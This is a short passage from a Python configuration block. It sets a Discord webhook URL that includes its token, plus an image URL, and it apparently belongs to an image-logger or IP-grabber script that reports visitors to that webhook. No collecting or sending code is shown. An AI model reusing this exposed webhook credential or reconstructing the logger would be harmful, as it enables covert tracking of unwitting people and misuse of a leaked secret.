...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1336028224173379705/WQkqgfKmXFfa9UENWuDPRvJgmvLIXa8eFnrgkvFrr19VryOcptcxLXlaqWKBfDrmnkOr",
    "image": "https://i.ibb.co/VWvYwvxt/image.png", # You can also have a custom image by using a URL argument
